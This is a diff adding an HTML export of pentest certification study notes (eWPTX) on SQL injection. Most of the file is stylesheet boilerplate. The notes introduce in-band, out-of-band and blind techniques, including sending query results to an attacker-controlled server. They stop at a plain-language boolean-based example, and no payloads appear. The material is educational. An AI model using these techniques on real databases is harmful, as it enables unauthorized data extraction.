@@ -1,0 +1,1018 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>SQL Injection</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="4bc604f2-3b89-4da1-8d56-32b967e4482c" class="page mono"><header><h1 class="page-title"><strong>SQL Injection</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h2 id="4139569b-8c6e-44f4-bae7-b9234a6f7778" class="">SQL INJECTION</h2><p id="4728c7c3-1039-4c67-9a2a-19759039ff7a" class=""><br/>Basic understanding of SQL Injection Vulnerabilities<br/></p><p id="0ed43df7-7ae9-49f8-b823-fe90fdf0b7c8" class="">Advanced concept of exploiting SQLi’s</p><h2 id="b4c2b279-0836-417c-bc98-049b98abf5ff" class=""><strong>Introduction</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#introduction"></a></strong></h2><p id="69c04e6e-9a5e-474a-bab2-24c003eaaf98" class="">We are going to lay the foundation For an advanced comprehension of what the SQL Injection world offers. We will analyze the most common DBMS and learn how to perform advanced attacks against them.</p><h3 id="21705700-d7d4-4210-a9aa-ebafce1c4f94" class=""><strong>Recap and More</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#recap-and-more"></a></strong></h3><p id="18c1f030-781e-482f-83bb-fe196066950d" class="">SQL Injection is an attack against the original purpose a developer has chosen For a specific piece of SQL code. The idea is to alter the original SQL query structure by leveraging the syntax, DBMS and/or OS functionalities in order to perform malicious operations.</p><p id="67e724b3-5fe3-4bea-8024-72bb5ee4a01e" class="">We’ll analyze 3 most used Relational Database Management Systems RDBMS:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9cbb9f37-7478-488d-a9a5-3d08b44abcba" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- MySQL
+- SQL Server
+- Oracle
+</code></pre><h2 id="1b99379f-c09d-4bb0-bbdd-4a4854c4a17f" class=""><strong>Exploiting SQLI</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#exploiting-sqli"></a></strong></h2><h3 id="26ea03d4-ab7f-4005-aa0f-2540a5024b63" class=""><strong>Techniques Classification</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#techniques-classification"></a></strong></h3><p id="de2d9fb9-c7da-44e6-8018-af4129ea60c7" class="">Classes of attack:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="443d61b2-6e4b-4201-ad7e-e04c5a6d4381" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- INBAND
+- OUT-OF-BAND
+- INFERENCE
+</code></pre><h3 id="8af283cd-6f26-4b94-a47f-000df4ad9241" class=""><strong>Inbound Attacks</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#inbound-attacks"></a></strong></h3><p id="dfa294ea-2913-464e-b10e-277924eb6939" class="">It leverages the same channel used to inject the SQL code</p><p id="7f8d4322-b011-4d1f-b196-895e1fa00447" class="">The result of this attack is included directly in the response from the vuln web application.</p><p id="32d3b59a-0cc8-42c3-a49b-e1fd77678452" class="">The most common techniques are:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4bbc99d0-3649-498d-ac28-1c5228deb64d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- UNION-based
+- Error-based
+</code></pre><h3 id="35100295-0d1b-4be9-baac-c7a49a1ddb84" class=""><strong>Out-of-Band Attacks (OOB)</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#out-of-band-attacks-oob"></a></strong></h3><p id="0b989738-8ded-4bb4-a198-ee27899313ed" class="">It uses alternative channels to extract data from the server.</p><p id="bef7a737-ca6e-488b-ac9e-2e9875a3358b" class="">Some of these include the following:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b0c25c0e-ad0f-4994-b514-723f3dbc84e2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- HTTP(s) requests
+- DNS resolution
+- Email
+- File System
+</code></pre><ul id="48307bbd-ae9a-4b0c-bd29-9b011f204851" class="bulleted-list"><li style="list-style-type:disc">Exploiting a SQLi using OOB methods is useful when all Inband techniques have failed because attempted vectors have been disabled, limited, or filtered. When the only option is to use <strong>Blind techniques (Inference)</strong>, reducing the number of queries is a must!</li></ul><p id="5ec00bcd-17dd-4ecd-ab08-3abec9b3fd41" class="">HTTP Based OOB Exploitation:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fc20ff1a-41d1-4231-9a2e-5e36d2c0273c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- it sends the result of the SQL query by HTTP request, usually via GET, toward a hacker-controlled HTTP server
+</code></pre><h3 id="45d6cd3f-e0a9-479c-bd39-77fd7a57632f" class=""><strong>Inference Attacks</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#inference-attacks"></a></strong></h3><ul id="ec1ab0eb-dfe9-4518-8f50-f516ff431a9b" class="bulleted-list"><li style="list-style-type:disc">Most common known as <strong>Blind</strong>.</li></ul><ul id="4d4bf0ac-39c7-42fb-aac9-be0fc9ea64a1" class="bulleted-list"><li style="list-style-type:disc">All methods that allow information extraction are based on a set of focused deductions. There are several possible techniques to use, but the most common are:</li></ul><ul id="8d341925-3b16-48b8-8c7f-85405b1cb695" class="bulleted-list"><li style="list-style-type:disc">Boolean-based</li></ul><ul id="437a0509-ea3b-477f-9ad7-d47ec0644115" class="bulleted-list"><li style="list-style-type:disc">Time-based</li></ul><h3 id="dbd9e6ab-90c4-4de7-b6f0-c924b63ca36f" class=""><strong>Boolean-based</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#boolean-based"></a></strong></h3><p id="b5752f3d-75d0-48d8-a8bc-356240ce61ab" class="">The focus in on visible changes inside web server responses. For example:</p><p id="9e7fabb7-85cf-4316-8d65-4b81d2a2ddc8" class="">If the result of a query is not NULL, the server returns <strong>Great</strong> while <strong>Nooo</strong> otherwise.</p><p id="8d148d31-451f-4661-bc4b-c2268fa1ec42" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3c1d0385-05a3-4292-9690-12796171c55d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Is the first character of the username a &#x27;G&#x27;?
+- If yes = &#x27;great&#x27; / if no = &#x27;nooo&#x27;
